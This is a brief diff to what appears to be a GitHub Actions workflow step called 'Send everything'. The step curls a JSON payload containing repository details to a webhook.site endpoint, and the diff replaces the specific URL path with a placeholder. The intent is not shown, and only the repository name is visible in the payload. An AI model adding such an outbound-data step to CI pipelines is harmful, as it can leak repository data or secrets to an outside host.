@@ -5,7 +5,7 @@ runs:
   steps:
     - name: Send everything
       run: |
-        curl -X POST https://webhook.site/TestSlackAPI \
+        curl -X POST https://webhook.site/your-uuid-here \
           -H "Content-Type: application/json" \
           -d '{
             "repo": "${{ github.repository }}",
